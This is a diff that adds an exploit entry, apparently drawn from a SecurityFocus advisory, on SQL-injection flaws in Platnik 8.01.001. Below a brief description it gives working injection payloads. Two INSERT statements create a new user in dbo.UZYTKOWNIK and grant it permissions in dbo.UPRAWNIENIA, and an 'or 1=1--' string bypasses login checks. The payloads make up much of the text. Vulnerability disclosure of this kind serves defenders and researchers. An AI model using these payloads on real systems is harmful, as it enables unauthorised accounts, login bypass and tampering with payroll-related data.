@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/40201/info
+
+Platnik is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Platnik 8.01.001 is affected; other versions may also be vulnerable. 
+
+INSERT INTO dbo.UZYTKOWNIK VALUES('LOGIN', 'TEST', 'TEST', 'password hash', '2010-02-28 15:46:48', null, 'A', null)--
+INSERT INTO dbo.UPRAWNIENIA VALUES(id_user, id_platnik)--
+or 1=1-- 
